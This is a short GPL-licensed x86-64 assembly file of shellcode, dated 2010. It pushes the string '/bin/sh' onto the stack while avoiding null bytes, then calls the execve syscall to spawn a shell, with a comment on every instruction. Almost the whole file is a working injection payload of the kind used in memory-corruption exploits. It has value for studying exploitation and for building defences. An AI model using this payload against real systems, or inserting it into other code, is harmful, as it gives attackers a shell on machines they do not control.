/*
 *      shellcode_x86-64.s
 *      
 *      Copyright 2010 Robin Nehls <nehls@mi.fu-berlin.de>
 *      
 *      This program is free software; you can redistribute it and/or modify
 *      it under the terms of the GNU General Public License as published by
 *      the Free Software Foundation; either version 2 of the License, or
 *      (at your option) any later version.
 *      
 *      This program is distributed in the hope that it will be useful,
 *      but WITHOUT ANY WARRANTY; without even the implied warranty of
 *      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *      GNU General Public License for more details.
 */

mov $0x68732f6e69622f30,%rdi    /* move "hs/nib/0" into rdi */
shr $8,%rdi                     /* shift right rdi by 8 bits to create "\0hs/nib/" turning the 0 at the end in a leading \0 :) */
push %rdi                       /* push "\0hs/nib/" to the stack */
mov %rsp,%rdi                   /* get pointer to "\0hs/nib/" on the stack */
push %rdi                       /* push that pointer to the stack */
xor %rdx,%rdx                   /* put 0 in rdx */
push %rdx                       /* push that 0 to the stack */
mov %rsp,%rsi                   /* move pointer to that 0 to rsi */
xor %rax,%rax                   /* put 0 in rax to be able to put 3b in rax without useing a null byte*/
mov $0x3b,%al                   /* move number for exec syscall into lower part of rax */
syscall                         /* execute the syscal */
